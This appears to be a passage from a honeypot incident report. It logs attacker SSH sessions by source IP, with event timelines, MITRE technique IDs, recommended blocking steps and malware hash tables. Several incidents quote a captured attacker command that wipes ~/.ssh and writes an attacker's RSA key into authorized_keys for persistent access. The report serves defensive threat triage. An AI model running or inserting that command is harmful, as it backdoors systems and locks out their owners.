| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:44:07` | `cowrie.session.connect` |
| `2026-06-05 17:44:07` | `cowrie.client.version` |
| `2026-06-05 17:44:08` | `cowrie.client.kex` |
| `2026-06-05 17:44:08` | `cowrie.login.success` |
| `2026-06-05 17:44:08` | `cowrie.session.params` |
| `2026-06-05 17:44:08` | `cowrie.command.input` |
| `2026-06-05 17:44:08` | `cowrie.command.failed` |
| `2026-06-05 17:44:08` | `cowrie.log.closed` |
| `2026-06-05 17:44:08` | `cowrie.session.params` |
| `2026-06-05 17:44:08` | `cowrie.command.input` |
| `2026-06-05 17:44:08` | `cowrie.session.file_download` |
| `2026-06-05 17:44:08` | `cowrie.log.closed` |
| `2026-06-05 17:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf40cb8a7a1f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:44 |
| **Last Seen** | 2026-06-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:44:10` | `cowrie.session.connect` |
| `2026-06-05 17:44:10` | `cowrie.client.version` |
| `2026-06-05 17:44:10` | `cowrie.client.kex` |
| `2026-06-05 17:44:10` | `cowrie.login.success` |
| `2026-06-05 17:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cac2de92b6c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:48 |
| **Last Seen** | 2026-06-05 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:48:54` | `cowrie.session.connect` |
| `2026-06-05 17:48:54` | `cowrie.client.version` |
| `2026-06-05 17:48:55` | `cowrie.client.kex` |
| `2026-06-05 17:48:55` | `cowrie.login.success` |
| `2026-06-05 17:48:55` | `cowrie.session.params` |
| `2026-06-05 17:48:55` | `cowrie.command.input` |
| `2026-06-05 17:48:55` | `cowrie.command.failed` |
| `2026-06-05 17:48:55` | `cowrie.log.closed` |
| `2026-06-05 17:48:55` | `cowrie.session.params` |
| `2026-06-05 17:48:55` | `cowrie.command.input` |
| `2026-06-05 17:48:55` | `cowrie.session.file_download` |
| `2026-06-05 17:48:55` | `cowrie.log.closed` |
| `2026-06-05 17:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e0cc9662a0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:48 |
| **Last Seen** | 2026-06-05 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:48:57` | `cowrie.session.connect` |
| `2026-06-05 17:48:57` | `cowrie.client.version` |
| `2026-06-05 17:48:57` | `cowrie.client.kex` |
| `2026-06-05 17:48:57` | `cowrie.login.success` |
| `2026-06-05 17:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dfdddf5157e

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:51 |
| **Last Seen** | 2026-06-05 17:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:51:17` | `cowrie.session.connect` |
| `2026-06-05 17:51:17` | `cowrie.client.version` |
| `2026-06-05 17:51:17` | `cowrie.client.kex` |
| `2026-06-05 17:51:18` | `cowrie.login.success` |
| `2026-06-05 17:51:18` | `cowrie.session.params` |
| `2026-06-05 17:51:18` | `cowrie.command.input` |
| `2026-06-05 17:51:18` | `cowrie.command.failed` |
| `2026-06-05 17:51:18` | `cowrie.log.closed` |
| `2026-06-05 17:51:18` | `cowrie.session.params` |
| `2026-06-05 17:51:18` | `cowrie.command.input` |
| `2026-06-05 17:51:18` | `cowrie.session.file_download` |
| `2026-06-05 17:51:18` | `cowrie.log.closed` |
| `2026-06-05 17:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7989e04e82

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:51 |
| **Last Seen** | 2026-06-05 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:51:20` | `cowrie.session.connect` |
| `2026-06-05 17:51:20` | `cowrie.client.version` |
| `2026-06-05 17:51:20` | `cowrie.client.kex` |
| `2026-06-05 17:51:20` | `cowrie.login.success` |
| `2026-06-05 17:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd39f23561e

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:53 |
| **Last Seen** | 2026-06-05 17:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:53:43` | `cowrie.session.connect` |
| `2026-06-05 17:53:43` | `cowrie.client.version` |
| `2026-06-05 17:53:43` | `cowrie.client.kex` |
| `2026-06-05 17:53:43` | `cowrie.login.success` |
| `2026-06-05 17:53:43` | `cowrie.session.params` |
| `2026-06-05 17:53:43` | `cowrie.command.input` |
| `2026-06-05 17:53:43` | `cowrie.command.failed` |
| `2026-06-05 17:53:43` | `cowrie.log.closed` |
| `2026-06-05 17:53:43` | `cowrie.session.params` |
| `2026-06-05 17:53:43` | `cowrie.command.input` |
| `2026-06-05 17:53:44` | `cowrie.session.file_download` |
| `2026-06-05 17:53:44` | `cowrie.log.closed` |
| `2026-06-05 17:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f14cfd0d04

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:53 |
| **Last Seen** | 2026-06-05 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:53:45` | `cowrie.session.connect` |
| `2026-06-05 17:53:45` | `cowrie.client.version` |
| `2026-06-05 17:53:45` | `cowrie.client.kex` |
| `2026-06-05 17:53:45` | `cowrie.login.success` |
| `2026-06-05 17:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73e821d10512

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 18:05 |
| **Last Seen** | 2026-06-05 18:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 18:05:09` | `cowrie.session.connect` |
| `2026-06-05 18:05:09` | `cowrie.client.version` |
| `2026-06-05 18:05:09` | `cowrie.client.kex` |
| `2026-06-05 18:05:09` | `cowrie.login.success` |
| `2026-06-05 18:05:09` | `cowrie.session.params` |
| `2026-06-05 18:05:09` | `cowrie.command.input` |
| `2026-06-05 18:05:09` | `cowrie.command.failed` |
| `2026-06-05 18:05:09` | `cowrie.log.closed` |
| `2026-06-05 18:05:09` | `cowrie.session.params` |
| `2026-06-05 18:05:09` | `cowrie.command.input` |
| `2026-06-05 18:05:09` | `cowrie.session.file_download` |
| `2026-06-05 18:05:09` | `cowrie.log.closed` |
| `2026-06-05 18:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40aaf306d57

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 18:05 |
| **Last Seen** | 2026-06-05 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 18:05:11` | `cowrie.session.connect` |
| `2026-06-05 18:05:11` | `cowrie.client.version` |
| `2026-06-05 18:05:11` | `cowrie.client.kex` |
| `2026-06-05 18:05:11` | `cowrie.login.success` |
| `2026-06-05 18:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a38714d6a5a

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 18:13 |
| **Last Seen** | 2026-06-05 18:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 18:13:41` | `cowrie.session.connect` |
| `2026-06-05 18:13:41` | `cowrie.client.version` |
| `2026-06-05 18:13:41` | `cowrie.client.kex` |
| `2026-06-05 18:13:41` | `cowrie.login.success` |
| `2026-06-05 18:13:41` | `cowrie.session.params` |
| `2026-06-05 18:13:41` | `cowrie.command.input` |
| `2026-06-05 18:13:41` | `cowrie.command.failed` |
| `2026-06-05 18:13:41` | `cowrie.log.closed` |
| `2026-06-05 18:13:41` | `cowrie.session.params` |
| `2026-06-05 18:13:41` | `cowrie.command.input` |
| `2026-06-05 18:13:42` | `cowrie.session.file_download` |
| `2026-06-05 18:13:42` | `cowrie.log.closed` |
| `2026-06-05 18:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748a0927bfcb

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 18:13 |
| **Last Seen** | 2026-06-05 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 18:13:43` | `cowrie.session.connect` |
| `2026-06-05 18:13:43` | `cowrie.client.version` |
| `2026-06-05 18:13:43` | `cowrie.client.kex` |
| `2026-06-05 18:13:43` | `cowrie.login.success` |
| `2026-06-05 18:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3343bc9d40

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-05 19:05 |
| **Last Seen** | 2026-06-05 19:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 19:05:14` | `cowrie.session.connect` |
| `2026-06-05 19:05:14` | `cowrie.client.version` |
| `2026-06-05 19:05:14` | `cowrie.client.kex` |
| `2026-06-05 19:05:15` | `cowrie.login.success` |
| `2026-06-05 19:05:15` | `cowrie.session.params` |
| `2026-06-05 19:05:15` | `cowrie.command.input` |
| `2026-06-05 19:05:15` | `cowrie.command.failed` |
| `2026-06-05 19:05:16` | `cowrie.log.closed` |
| `2026-06-05 19:05:16` | `cowrie.session.params` |
| `2026-06-05 19:05:16` | `cowrie.command.input` |
| `2026-06-05 19:05:16` | `cowrie.session.file_download` |
| `2026-06-05 19:05:16` | `cowrie.log.closed` |
| `2026-06-05 19:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71795f28aed8

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-05 19:05 |
| **Last Seen** | 2026-06-05 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 19:05:19` | `cowrie.session.connect` |
| `2026-06-05 19:05:19` | `cowrie.client.version` |
| `2026-06-05 19:05:19` | `cowrie.client.kex` |
| `2026-06-05 19:05:19` | `cowrie.login.success` |
| `2026-06-05 19:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.38[.]122` | **25** | 2026-06-05 16:39 | 2026-06-05 16:44 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `115.190.241[.]179` | **20** | 2026-06-05 19:21 | 2026-06-05 19:55 | 25m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.113.23[.]170` | **16** | 2026-06-05 19:30 | 2026-06-05 19:58 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.255.61[.]0` | **11** | 2026-06-05 19:22 | 2026-06-05 19:54 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `166.62.102[.]109` | **9** | 2026-06-05 16:37 | 2026-06-05 19:55 | 4m | 0 | `T1592` | 🟢 LOW |
| `156.239.224[.]79` | **4** | 2026-06-05 17:55 | 2026-06-05 19:05 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.222.201[.]82` | **3** | 2026-06-05 17:58 | 2026-06-05 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]59` | **3** | 2026-06-05 19:31 | 2026-06-05 19:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]95` | **3** | 2026-06-05 19:32 | 2026-06-05 19:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.250.151[.]241` | **2** | 2026-06-05 17:28 | 2026-06-05 17:31 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | **2** | 2026-06-05 18:45 | 2026-06-05 18:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `223.123.38[.]32` | **2** | 2026-06-05 16:47 | 2026-06-05 16:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.54[.]120` | 1 | 2026-06-05 19:45 | 2026-06-05 19:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]31` | 1 | 2026-06-05 18:13 | 2026-06-05 18:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]61` | 1 | 2026-06-05 19:41 | 2026-06-05 19:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.61.35[.]204` | 1 | 2026-06-05 17:59 | 2026-06-05 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.224.131[.]83` | 1 | 2026-06-05 17:44 | 2026-06-05 17:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]168` | 1 | 2026-06-05 19:42 | 2026-06-05 19:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-06-05 18:10 | 2026-06-05 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.104.147[.]6` | 1 | 2026-06-05 19:35 | 2026-06-05 19:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.48.170[.]235` | 1 | 2026-06-05 16:59 | 2026-06-05 17:01 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
